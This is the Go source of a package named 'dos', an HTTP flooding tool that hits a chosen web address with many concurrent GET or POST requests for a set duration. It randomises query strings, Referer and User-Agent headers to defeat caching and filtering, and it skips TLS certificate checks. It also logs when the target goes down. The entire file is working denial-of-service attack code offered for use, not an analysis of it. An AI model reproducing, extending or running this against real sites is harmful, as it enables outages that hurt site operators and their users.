// Author: PiereLucas

package dos

import (
	"context"
	"crypto/tls"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

// TargetInf - struct for webaddress and formnames
type TargetInf struct {
	mode              string
	threads           int
	duration          int
	webaddress        string
	formnames         url.Values
	headers           map[string]string
	authSet           bool
	authUser          string
	authPass          string
	persistentHeaders http.Header
}

// AddWebaddress - Add or Change value for TargetInf.webaddress
func (inf *TargetInf) AddWebaddress(webAddress string) string {
	inf.webaddress = webAddress
	return inf.webaddress
}

// AddForm - Add formname to TargetInf.formnames
func (inf *TargetInf) AddForm(formName string, formValue string) url.Values {
	if inf.formnames == nil {
		_ = inf.MakeForms()
	}
	inf.formnames.Add(formName, formValue)
	return inf.formnames
}

// AddHeader - Add header to TargetInf.headers
func (inf *TargetInf) AddHeader(key string, value string) map[string]string {
	if inf.headers == nil {
		_ = inf.MakeHeaders()
	}
	inf.headers[key] = value
	return inf.headers
}

// AddAuth - Add basic HTTP authentication user and password
func (inf *TargetInf) AddAuth(user string, password string) {
	inf.authPass = user
	inf.authPass = password
	inf.authSet = true
	return
}

// AppendMore - Append map[string]string key:value pairs to forms or header.
// makes use of internal functions TargetInf.AddForm and TargetInf.AddHeader
// mode = FORMS (for forms)
// mode = HEADERS (for headers)
func (inf *TargetInf) AppendMore(mode string, input map[string]string, wg *sync.WaitGroup) {
	for key, value := range input {
		if mode == "FORMS" {
			inf.AddForm(key, value)
		} else if mode == "HEADERS" {
			inf.AddHeader(key, value)
		} else {
			log.Fatalln("ERROR: in func appendToStruct - wrong mode! [FORMS / HEADERS]")
		}
	}

	wg.Done()
}

// MakeForms - initialize the internal Values struct.
// This function is process using TargetInf.AddForm
func (inf *TargetInf) MakeForms() url.Values {
	inf.formnames = url.Values{}
	return inf.formnames
}

// MakeHeaders - initialize the internal header map.
// This function is process using TargetInf.AddHeader
func (inf *TargetInf) MakeHeaders() map[string]string {
	inf.headers = make(map[string]string)
	return inf.headers
}

// Copy - Copy the TargetInf Struct
func (inf *TargetInf) Copy() TargetInf {
	return *inf // De-reference pointer (return-by-value)
}

// New - Initialize new DoS
// m = mode, dur = duration, thr = threads, addr = webaddress
func New(m string, d int, t int, addr string) *TargetInf {
	return &TargetInf{
		mode:       m,
		formnames:  url.Values{},
		headers:    make(map[string]string),
		threads:    t,
		duration:   d,
		webaddress: addr,
	}
}

// makeRequest - alternative makeRequest() function for work together with syncedStart()
func syncedMakeRequest(start <-chan struct{}, info *TargetInf) {
	<-start

	// Set Transport states
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // skip tls verify for more speed
		Proxy:           http.ProxyFromEnvironment,             // use proxies from environment variables
	}

	// Initialize Client
	hc := &http.Client{
		Transport: tr,
	}

	result := make(chan *http.Request)
	go buildRequest(result, info) // Building our request
	req := <-result               // Wait for our request

	r := runtime.NumGoroutine()
	resp, err := hc.Do(req)
	if err != nil {
		//log.Printf("ERROR: do post request: %s\n", err) // FOR DEBUG
		log.Printf("\tRoutine: %6d |    CONNECTION DOWN (DIAL ERROR) | [%s] %s\n", r, info.mode, req.URL)

		close(result) // Close request result channel

	} else { // Catch some Error e.g. "socket: too many open files" or "socket: connection reset by peer"
		defer resp.Body.Close() // Close response body at end of function

		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
			log.Printf("\tRoutine: %6d | HTTP Status is in the 2xx range | [%s] %s\n", r, info.mode, req.URL)
		} else {
			log.Printf("\tRoutine: %6d |   Argh! Online but Broken [%3d] | [%s] %s\n", r, resp.StatusCode, info.mode, req.URL)
		}

		close(result) // Close request result channel
	}
}

// syncedStart - alternative start() function for synchronised start of syncedMakeRequest()
// flooding comes in intervals of 1sec
func syncedStart(ctx context.Context, info *TargetInf, done chan<- struct{}) {
	// Build initial request (It's irrelevant if GET or POST cause we don't send this initial request to target)
	func() {
		log.Println("INFO: Building Initial Request")
		result := make(chan *http.Request) // create channel result
		go buildRequest(result, info)      // Building initial request
		_ = <-result
		close(result) // Wait for initial request to be done
	}()

	close(done)

	for {
		select {
		case <-ctx.Done():
			log.Println("INFO: Shutdown runner...")
			return
		default:
			start := make(chan struct{})
			for i := 1; i < info.threads+1; i++ {
				go syncedMakeRequest(start, info)
			}
			close(start)
			time.Sleep(1 * time.Second)
		}
	}
}

// makeRequest - handle our complete request workflow. Build Clients and Requests
func makeRequest(done chan<- struct{}, info *TargetInf) {
	// Set Transport states
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // skip tls verify for more speed
		Proxy:           http.ProxyFromEnvironment,             // use proxies from environment variables
	}

	// Initialize Client
	hc := &http.Client{
		Transport: tr,
	}

	result := make(chan *http.Request)
	go buildRequest(result, info) // Building our request
	req := <-result               // Wait for our request

	r := runtime.NumGoroutine()
	resp, err := hc.Do(req)
	if err != nil {
		//log.Printf("ERROR: do post request: %s\n", err) // FOR DEBUG
		log.Printf("\tRoutine: %6d |    CONNECTION DOWN (DIAL ERROR) | [%s] %s\n", r, info.mode, req.URL)

		close(result) // Close request result channel
		close(done)   // sending empty data to done channel
	} else { // Catch some Error e.g. "socket: too many open files" or "socket: connection reset by peer"
		defer resp.Body.Close() // Close response body at end of function

		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
			log.Printf("\tRoutine: %6d | HTTP Status is in the 2xx range | [%s] %s\n", r, info.mode, req.URL)
		} else {
			log.Printf("\tRoutine: %6d |   Argh! Online but Broken [%3d] | [%s] %s\n", r, resp.StatusCode, info.mode, req.URL)
		}

		close(result) // Close request result channel
		close(done)   // sending empty data to done channel
	}
}

// runner - function with context that start makeRequest() and return on ctx.Done()
func runner(ctx context.Context, start <-chan struct{}, info *TargetInf) {
	<-start // Starting routine on close of channel starter

	for {
		select {
		case <-ctx.Done(): // Quit routine on receive
			log.Println("INFO: Shutdown runner...")
			return // Close runner goroutine
		default:
			done := make(chan struct{})
			go makeRequest(done, info)
			select {
			case <-done: // Continue when the reset finish faster than 1sec (This will mostly not happen, definitivly)
				continue
			case <-time.After(1 * time.Second): // make sure that every second start a new request, still when the last not finish yet
				continue
			}
		}
	}
}

// start - starting N*runner() and building initial request
func start(ctx context.Context, info *TargetInf, done chan<- struct{}) {
	start := make(chan struct{})

	// starting as many routines as defined by user
	for i := 1; i < info.threads+1; i++ {
		log.Printf("INFO: Starting routine: %d\n", i)
		go runner(ctx, start, info)
	}

	// Build initial request (It's irrelevant if GET or POST cause we don't send this initial request to target)
	func() {
		log.Println("INFO: Building Initial Request")
		result := make(chan *http.Request) // create channel result
		go buildRequest(result, info)      // Building initial request
		_ = <-result
		close(result) // Wait for initial request to be done
	}()

	close(start) // close channel starter to start runner routines
	close(done)  // synchronise and unlock sync in parent function
}

// buildRequest - building POST request and copy forms and headers in a peristent state
func buildRequest(result chan<- *http.Request, info *TargetInf) {
	// Return function
	returnReq := func(req *http.Request) {
		// Building initial request
		if info.persistentHeaders == nil { // add headers and authorization (if set) to request and make it persistent
			log.Println("INFO: Make Header and Authorization (if set) persistent") // log the build request
			for key, value := range info.headers {
				req.Header.Set(key, value)
			}
			if info.authSet {
				req.SetBasicAuth(info.authUser, info.authPass) // base64 encode auth and set value to header
				tempVal := req.Header.Values("Authorization")[0]
				req.Header.Set("Authorization", tempVal) // Set the base64 encoded authorization header
			}

			// overrride user preferences "Accept-Charset", Connection" and "Cache-Control"
			func() {
				log.Println("INFO: overrride user preferences Accept-Charset, Connection and Cache-Control")
				log.Println("INFO: override Keep-Alive, Referer and User-Agent random on every new request")
				req.Header.Set("Accept-Charset", acceptCharset)
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("Cache-Control", "no-cache")
			}()

			info.persistentHeaders = req.Header.Clone() // clone req.Header into info.persistenHeader

		} else {
			req.Header = info.persistentHeaders.Clone() // clone persistent headers to request headers
			// Change some header preferences on every single request. Override the persistent state of the keys
			func() {
				req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
				req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
				req.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
			}()
		}
		result <- req // send request over channel back to ... (maybe calling function, or, wherever the channel waits)
	}

	// Building Request GET or POST mode available
	if info.mode == "GET" {
		// param joiner
		var paramJoiner string
		if strings.ContainsRune(info.webaddress, '?') {
			paramJoiner = "&"
		} else {
			paramJoiner = "?"
		}

		/*
			// Build random parameter
			r := rand.New(rand.NewSource(time.Now().UnixNano())) // Generate Random int
			rndp := fmt.Sprintf("?rand=%d", r.Uint64())
		*/

		// Building request and add values to request
		req, err := http.NewRequest("GET", info.webaddress+paramJoiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
		if err != nil {
			log.Println("ERROR: building request")
		}

		returnReq(req)
	} else if info.mode == "POST" {
		// Building request and add values to request
		req, err := http.NewRequest("POST", info.webaddress, strings.NewReader(info.formnames.Encode()))
		if err != nil {
			log.Println("ERROR: building request")
		}

		req.PostForm = info.formnames // reference url.Values too request

		returnReq(req)
	} else {
		log.Fatalln("ERROR: buildingRequest() unrecognized MODE")
	}
}

// random block function
func buildblock(size int) string {
	var block []rune
	for i := 0; i < size; i++ {
		block = append(block, rune(rand.Intn(25)+65))
	}
	return string(block)
}

// validateThreads - warns if more threads starting as cpu cores available
func validateThreads(info *TargetInf, done chan<- struct{}) {
	nCores := runtime.NumCPU() // runtime.NumCPU() returns the number of available CPU Cores
	if nCores < info.threads {
		log.Printf("WARNING: more routines: %d than cores: %d\n", info.threads, nCores)
		time.Sleep(3 * time.Second)
	}
	close(done)
}

// Dos - start Dos and returns error or nil
func (inf *TargetInf) Dos(wg *sync.WaitGroup) {
	// Set up log
	log.Printf("INFO: Starting DOS | Target: %s | Mode: %s | Duration: %d\n", inf.webaddress, inf.mode, inf.duration)
	log.Println("INFO: Beginning Setup ...")

	dostime := time.Duration(inf.duration) * time.Second // sum dostime

	ctx, cancel := context.WithTimeout(context.Background(), dostime) // Intialize context with timeout

	// defer func
	defer func() {
		log.Println("Info: Exit DOS | Routines are now shutting down")
		cancel()
	}()

	// catch SIGINT (CTRL+C) and os.Interrupt
	c := make(chan os.Signal, 1)
	go func() {
		signal.Notify(c, os.Interrupt, syscall.SIGTERM)
		<-c
		log.Println("ABORT: you pressed ctrl+c")
		log.Println("Info: Exit DOS | Routines are now shutting down")
		cancel()
		/*
			for sig := range c {
				// sig is a ^C, handle it
			}
		*/
	}()

	// validate
	sync := make(chan struct{})
	go validateThreads(inf, sync) // validate Threads
	<-sync                        // wait for validateThreads

	// start
	sync = make(chan struct{})
	go start(ctx, inf, sync) // start routines
	<-sync                   // wait for start routine

	<-ctx.Done() // wait for context done
	wg.Done()

	return // return to calling routine
}
